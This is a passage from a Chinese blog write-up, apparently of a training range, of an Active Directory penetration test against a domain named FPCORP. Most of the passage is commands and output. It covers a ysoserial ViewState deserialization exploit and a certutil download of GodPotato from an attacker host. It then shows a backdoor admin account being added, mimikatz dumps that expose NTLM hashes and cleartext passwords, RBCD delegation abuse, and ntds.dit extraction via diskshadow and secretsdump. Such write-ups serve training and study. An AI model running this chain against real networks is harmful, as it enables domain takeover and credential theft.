+</span></span><span class="line"><span class="cl">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &#34;ExploitClass2.cs;./System.dll;./System.Web.dll&#34; --path=&#34;/Default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;6424A8B2C8CE51FEFECBDBE795A8F33EBD81234CB655F610EEC49CFA13F89CC1&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;1B7E26950A9C9ABFE4FE72FF25649D4DC4CA6286F3943D3ABB1B70AC6D81142D000CC3880E137C49954EF6284980381A2C674F785C13C960BDE13CB2595873FD&#34; --viewstateuserkey=&#34;b542e0802c6d419cbb7d7a0d9ac29db1&#34; --isdebug
+</span></span></code></pre></div></div><p><code>ExploitClass2.cs</code>里是个马,然后传参带上 cmd,执行命令</p>
+<p>搜集一下 <code>whoami /priv</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">特权名                        描述                 状态  
+</span></span><span class="line"><span class="cl">============================= ==================== ======
+</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
+</span></span><span class="line"><span class="cl">SeAuditPrivilege              生成安全审核         已禁用
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       绕过遍历检查         已启用
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege        身份验证后模拟客户端 已启用
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       创建全局对象         已启用
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>用GodPotato提权</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://172.22.10.17/GodPotato.exe C:\Windows\Temp\GodPotato.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Windows\Temp\GodPotato.exe -cmd &#34;net user dionysus qwer1234! /add&#34;
+</span></span><span class="line"><span class="cl">C:\Windows\Temp\GodPotato.exe -cmd &#34;net localgroup administrators dionysus /add&#34; 
+</span></span></code></pre></div></div><p>RDP登录上去猕猴桃抓一下</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">mimikatz.exe
+</span></span><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></div></div><p>可以抓到管理 hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c4959ee9eaac8a9adb8beda8ab0fc6bd:::
+</span></span></code></pre></div></div><p>访问文件系统</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:c4959ee9eaac8a9adb8beda8ab0fc6bd -no-pass -dc-ip 172.22.20.25 &#39;FPCORP/FPSRVIIS03$@172.22.20.32&#39;
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>有东西但是不知道怎么用,filesrv 全是垃圾</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ADMIN$
+</span></span><span class="line"><span class="cl">C$
+</span></span><span class="line"><span class="cl">filesrv
+</span></span><span class="line"><span class="cl">IPC$
+</span></span></code></pre></div></div><h4 id="芝士雪豹">芝士雪豹</h4>
+<p>这个时候跑一下SharpHound搜集信息,了解一下思路</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/cc231cca6cb195fbfe338a24f168fcbc.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/cc231cca6cb195fbfe338a24f168fcbc.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>非常清晰, 拿 LIU 账户权限, 利用 <code>GenericWrite</code> 属性, 打 RBCD, 之后抓 <code>SVC_BKPADMIN</code>的 hash, CanPSRemote 过去之后提权即可.</p>
+<h3 id="172.22.20.165">172.22.20.165</h3>
+<p>38 那台 flag 同目录下提示, 去找 vs 的被下载的日志, 发现两分钟被下载一次</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250810151456.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250810151456.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>我是真不理解, 定时轮询拉的 exe, 替换 exe 后拿不到监听.</p>
+<h4 id="免杀">免杀</h4>
+<p>真相是有个 defender, 向学长借一个马. flag 在 administrator桌面, 用户就是 administrator 组, 只不过要bypassUAC绕过</p>
+<h3 id="172.22.20.32">172.22.20.32</h3>
+<blockquote>
+<p>此处有个非常恶心人的东西, 装 360 关掉 Windows Defender 后, 总是弹出有问题要重启, 然后需要的 liu 账户就消失了</p>
+</blockquote>
+<p>用 <code>HashDump.exe</code> 转储一下</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Authentication Id : 0 ; 128183 (00000000:0001f4b7)
+</span></span><span class="line"><span class="cl">Session           : Service from 0
+</span></span><span class="line"><span class="cl">User Name         : liu654
+</span></span><span class="line"><span class="cl">Domain            : FPCORP
+</span></span><span class="line"><span class="cl">Logon Server      : FPSRVAD01
+</span></span><span class="line"><span class="cl">Logon Time        : 2025/8/11 23:12:32
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3225782379-1150096479-4236096888-1138
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         [00000003] Primary
+</span></span><span class="line"><span class="cl">         * Username : liu654
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP
+</span></span><span class="line"><span class="cl">         * NTLM     : 9d0692eade0a6529acb5f0b122ae8763
+</span></span><span class="line"><span class="cl">         * SHA1     : ab55a10d983dfb60e0f633175af8e6e939bfb020
+</span></span><span class="line"><span class="cl">         * DPAPI    : 769347cc561870207141327479e8be4e
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : liu654
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP
+</span></span><span class="line"><span class="cl">         * Password : (null)
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : liu654
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP.INT
+</span></span><span class="line"><span class="cl">         * Password : p1Uf^yko@+yHS
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">        cloudap :
+</span></span></code></pre></div></div><p>之前分析一下域内关系就知道, 拿到<code>liu654</code>的账户之后,接下来是经典的 RBCD 了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">addcomputer.py -method SAMR FPCORP.INT/liu654:&#39;p1Uf^yko@+yHS&#39; -computer-name test\$ -computer-pass Passw0rd -dc-ip 172.22.20.25
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rbcd.py FPCORP.INT/liu654 -hashes :9d0692eade0a6529acb5f0b122ae8763 -dc-ip 172.22.20.25 -action write -delegate-to FPSRVFS02\$ -delegate-from test\$
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>之后就连上去了, 注意别用 psexec,会被Windows defender 杀掉的</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">export KRB5CCNAME=administrator@cifs_FPSRVFS02.fpcorp.int@FPCORP.INT.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wmiexec.py Administrator@FPSRVFS02.fpcorp.int -k -no-pass -dc-ip 172.22.20.25 -codec gbk
+</span></span></code></pre></div></div><p>拿到权限之后上去直接抓 hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Authentication Id : 0 ; 95966 (00000000:000176de)
+</span></span><span class="line"><span class="cl">Session           : Service from 0
+</span></span><span class="line"><span class="cl">User Name         : svc_bkpadmin
+</span></span><span class="line"><span class="cl">Domain            : FPCORP
+</span></span><span class="line"><span class="cl">Logon Server      : FPSRVAD01
+</span></span><span class="line"><span class="cl">Logon Time        : 2025/8/11 23:12:54
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3225782379-1150096479-4236096888-1176
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         [00000003] Primary
+</span></span><span class="line"><span class="cl">         * Username : svc_bkpadmin
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP
+</span></span><span class="line"><span class="cl">         * NTLM     : f2f3e075ca082813f0d8191f947b0e01
+</span></span><span class="line"><span class="cl">         * SHA1     : 272514fca4ff5d1dbde31190d29158693c788333
+</span></span><span class="line"><span class="cl">         * DPAPI    : f5b7f440b2e68c1592f2dd9d7d8e0466
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : svc_bkpadmin
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP
+</span></span><span class="line"><span class="cl">         * Password : (null)
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : svc_bkpadmin
+</span></span><span class="line"><span class="cl">         * Domain   : FPCORP.INT
+</span></span><span class="line"><span class="cl">         * Password : kzmR^lBw1!8BL
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">        cloudap :
+</span></span></code></pre></div></div><h3 id="172.22.20.25-域控">172.22.20.25 域控</h3>
+<p>有了用户名和密码, 有CanPSRemote权限, 直接拿下</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">evil-winrm -i 172.22.20.25 -u svc_bkpadmin -p &#39;kzmR^lBw1!8BL&#39;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">特权信息
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">特权名                        描述             状态
+</span></span><span class="line"><span class="cl">============================= ================ ======
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     将工作站添加到域 已启用
+</span></span><span class="line"><span class="cl">SeBackupPrivilege             备份文件和目录   已启用
+</span></span><span class="line"><span class="cl">SeRestorePrivilege            还原文件和目录   已启用
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege           关闭系统         已启用
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       绕过遍历检查     已启用
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用
+</span></span></code></pre></div></div><p>之后是卷影复制,记得用<code>unix2dos raj.dsh</code>转一下格式</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">#raj.dsh
+</span></span><span class="line"><span class="cl">set context persistent nowriters
+</span></span><span class="line"><span class="cl">add volume c: alias raj
+</span></span><span class="line"><span class="cl">create
+</span></span><span class="line"><span class="cl">expose %raj% z:
+</span></span></code></pre></div></div><p>转储一下文件</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">#上传之后
+</span></span><span class="line"><span class="cl">diskshadow /s raj.dsh
+</span></span><span class="line"><span class="cl">RoboCopy /b z:\windows\ntds . ntds.dit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">reg save HKLM\system C:\Windows\Temp\system /y
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p><code>evil-winrm</code>直接 download 下来, <code>impacket-secretsdump -ntds ntds.dit -system system local</code></p>
+<p>可以拿到管理员的 hash <code>972ffc4a036603066d388a1e28b4f583</code> , 直接拿下最后一台机器</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">wmiexec.py -hashes :972ffc4a036603066d388a1e28b4f583 Administrator@172.22.20.25 -codec gbk
+</span></span></code></pre></div></div></article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/fake-it-till-u-make-it" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Fake it till u make it</p>
+            </a>
+            
+
+            
+            <a href="/post/ciscn-2025-%e5%86%b3%e8%b5%9b" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">CISCN-2025-决赛</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
